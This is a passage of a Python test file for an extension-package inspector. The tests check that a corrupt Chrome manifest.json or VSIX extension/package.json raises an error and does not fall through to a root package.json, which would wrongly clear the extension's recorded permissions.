    would turn a *valid* manifest into an InspectorError — the keep-stale path —
    and quietly freeze that extension's analysis."""
    text = json.dumps(manifest)
    assert json.loads(_strip_json_comments(text)) == manifest


def test_broken_manifest_json_does_not_fall_through_to_package_json():
    """The highest-priority candidate present is authoritative.

    A Chrome extension whose `manifest.json` is corrupt but which also ships
    npm/build metadata in `package.json` — common — used to match that instead,
    be classified as VS Code on the filename, and have its permissions cleared
    to []. That is the same permission erasure and spurious removal alert this
    fix exists to prevent, reached by a longer route.
    """
    data = make_zip(
        {
            "manifest.json": "{ corrupt",
            "package.json": json.dumps({"name": "build-metadata", "version": "1.0.0", "devDependencies": {}}),
            "bg.js": "console.log(1);",
        }
    )
    with pytest.raises(InspectorError, match="manifest.json"):
        inspect_package(data)


def test_broken_vsix_manifest_does_not_fall_through_either():
    """Same rule one level down: a corrupt `extension/package.json` must not be
    silently replaced by a root `package.json`."""
    data = make_zip(
        {
            "extension/package.json": "{ corrupt",
            "package.json": json.dumps({"name": "outer", "version": "1.0.0", "contributes": {}}),
        }
    )
    with pytest.raises(InspectorError, match="extension/package.json"):
        inspect_package(data)


def test_lower_priority_candidate_is_still_used_when_the_higher_one_is_absent():
    """No fallthrough on *failure* must not become no fallthrough at all —
    a VSIX with only `extension/package.json` still resolves."""
    data = make_zip(
        {
            "extension/package.json": json.dumps({"name": "e", "version": "1", "contributes": {}}),
            "extension/main.js": "console.log(1);",
        }
    )
    result = inspect_package(data)
    assert result.permissions == []
    assert "manifest_v2" not in _finding_codes(result)
